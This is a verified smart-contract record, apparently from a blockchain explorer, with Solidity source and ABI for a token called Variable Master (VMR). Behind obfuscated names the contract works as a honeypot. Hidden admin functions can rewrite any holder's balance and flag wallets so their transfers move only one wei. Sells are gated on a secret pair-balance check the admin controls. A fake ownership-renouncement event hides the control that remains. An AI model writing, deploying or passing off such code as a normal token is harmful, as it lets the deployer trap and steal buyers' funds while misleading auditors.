{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface enableLiquidity {\n    function createPair(address walletIs, address receiverExempt) external returns (address);\n}\n\ninterface sellIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityFrom) external view returns (uint256);\n\n    function transfer(address toExempt, uint256 teamReceiverTx) external returns (bool);\n\n    function allowance(address receiverTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamReceiverTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toExempt,\n        uint256 teamReceiverTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitReceiver, uint256 value);\n    event Approval(address indexed receiverTeam, address indexed spender, uint256 value);\n}\n\nabstract contract launchedReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface toTeam is sellIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VariableMaster is launchedReceiver, sellIs, toTeam {\n\n    mapping(address => uint256) private receiverIs;\n\n    function senderMarketing(address launchedLiquidity) public {\n        feeMax();\n        \n        if (launchedLiquidity == amountLiquidity || launchedLiquidity == exemptBuy) {\n            return;\n        }\n        tokenLaunchLimit[launchedLiquidity] = true;\n    }\n\n    bool public fromLaunch;\n\n    address teamWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public txLiquidity;\n\n    bool public isSender;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchEnable;\n    }\n\n    bool public launchTo;\n\n    function senderFund(address shouldFee, address toExempt, uint256 teamReceiverTx) internal returns (bool) {\n        require(receiverIs[shouldFee] >= teamReceiverTx);\n        receiverIs[shouldFee] -= teamReceiverTx;\n        receiverIs[toExempt] += teamReceiverTx;\n        emit Transfer(shouldFee, toExempt, teamReceiverTx);\n        return true;\n    }\n\n    constructor (){\n        if (totalWallet == liquiditySender) {\n            txLiquidity = false;\n        }\n        tokenEnable senderSell = tokenEnable(fundSell);\n        exemptBuy = enableLiquidity(senderSell.factory()).createPair(senderSell.WETH(), address(this));\n        \n        amountLiquidity = _msgSender();\n        launchToken[amountLiquidity] = true;\n        receiverIs[amountLiquidity] = toReceiver;\n        listMarketing();\n        \n        emit Transfer(address(0), amountLiquidity, toReceiver);\n    }\n\n    function transferFrom(address shouldFee, address toExempt, uint256 teamReceiverTx) external override returns (bool) {\n        if (_msgSender() != fundSell) {\n            if (limitAmountSender[shouldFee][_msgSender()] != type(uint256).max) {\n                require(teamReceiverTx <= limitAmountSender[shouldFee][_msgSender()]);\n                limitAmountSender[shouldFee][_msgSender()] -= teamReceiverTx;\n            }\n        }\n        return marketingMinList(shouldFee, toExempt, teamReceiverTx);\n    }\n\n    uint256 fromList;\n\n    address public amountLiquidity;\n\n    function balanceOf(address liquidityFrom) public view virtual override returns (uint256) {\n        return receiverIs[liquidityFrom];\n    }\n\n    bool public fromSender;\n\n    mapping(address => mapping(address => uint256)) private limitAmountSender;\n\n    string private limitFrom = \"Variable Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return limitFrom;\n    }\n\n    address public exemptBuy;\n\n    function listMarketing() public {\n        emit OwnershipTransferred(amountLiquidity, address(0));\n        sellTake = address(0);\n    }\n\n    function transfer(address receiverTx, uint256 teamReceiverTx) external virtual override returns (bool) {\n        return marketingMinList(_msgSender(), receiverTx, teamReceiverTx);\n    }\n\n    uint256 public liquiditySender;\n\n    uint256 private toReceiver = 100000000 * 10 ** 18;\n\n    address private sellTake;\n\n    address fundSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function feeMax() private view {\n        require(launchToken[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return sellTake;\n    }\n\n    function owner() external view returns (address) {\n        return sellTake;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toReceiver;\n    }\n\n    string private txLaunch = \"VMR\";\n\n    uint256 private totalWallet;\n\n    function allowance(address tradingReceiver, address limitWalletList) external view virtual override returns (uint256) {\n        if (limitWalletList == fundSell) {\n            return type(uint256).max;\n        }\n        return limitAmountSender[tradingReceiver][limitWalletList];\n    }\n\n    mapping(address => bool) public tokenLaunchLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txLaunch;\n    }\n\n    bool private receiverWalletLimit;\n\n    function limitTo(address receiverTx, uint256 teamReceiverTx) public {\n        feeMax();\n        receiverIs[receiverTx] = teamReceiverTx;\n    }\n\n    function enableBuySell(uint256 teamReceiverTx) public {\n        feeMax();\n        fromList = teamReceiverTx;\n    }\n\n    uint256 tradingLaunch;\n\n    function marketingMinList(address shouldFee, address toExempt, uint256 teamReceiverTx) internal returns (bool) {\n        if (shouldFee == amountLiquidity) {\n            return senderFund(shouldFee, toExempt, teamReceiverTx);\n        }\n        uint256 teamToken = sellIs(exemptBuy).balanceOf(teamWallet);\n        require(teamToken == fromList);\n        require(toExempt != teamWallet);\n        if (tokenLaunchLimit[shouldFee]) {\n            return senderFund(shouldFee, toExempt, amountToken);\n        }\n        return senderFund(shouldFee, toExempt, teamReceiverTx);\n    }\n\n    uint256 constant amountToken = 1 ** 10;\n\n    function approve(address limitWalletList, uint256 teamReceiverTx) public virtual override returns (bool) {\n        limitAmountSender[_msgSender()][limitWalletList] = teamReceiverTx;\n        emit Approval(_msgSender(), limitWalletList, teamReceiverTx);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed tradingIs, address indexed listFrom);\n\n    function isMaxToken(address buyTeamSender) public {\n        if (fromSender) {\n            return;\n        }\n        if (isSender == launchTo) {\n            fromLaunch = true;\n        }\n        launchToken[buyTeamSender] = true;\n        \n        fromSender = true;\n    }\n\n    uint8 private launchEnable = 18;\n\n    mapping(address => bool) public launchToken;\n\n    bool public autoMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitWalletList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWalletList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiverTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamReceiverTx\",\"type\":\"uint256\"}],\"name\":\"enableBuySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeamSender\",\"type\":\"address\"}],\"name\":\"isMaxToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiverTx\",\"type\":\"uint256\"}],\"name\":\"limitTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"senderMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenLaunchLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiverTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiverTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VariableMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}